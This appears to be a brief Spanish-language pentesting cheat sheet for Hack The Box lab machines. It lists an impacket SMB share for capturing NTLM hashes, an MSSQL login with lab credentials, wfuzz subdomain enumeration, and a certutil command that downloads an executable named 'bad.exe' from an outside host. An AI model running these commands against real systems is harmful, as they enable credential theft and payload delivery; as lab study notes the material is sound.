



# smb

crear una carpeta compartida rapida por smb y poder capturar hashes NTLM

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```



## mssql

```bash
impacket-mssqlclient  sequel.htb/PublicUser:GuestUserCantWrite1@sequel.htb
```





## Subdomain enumeration

```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" --hl 154
```






## File trasnfer

```bash
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
```

```
```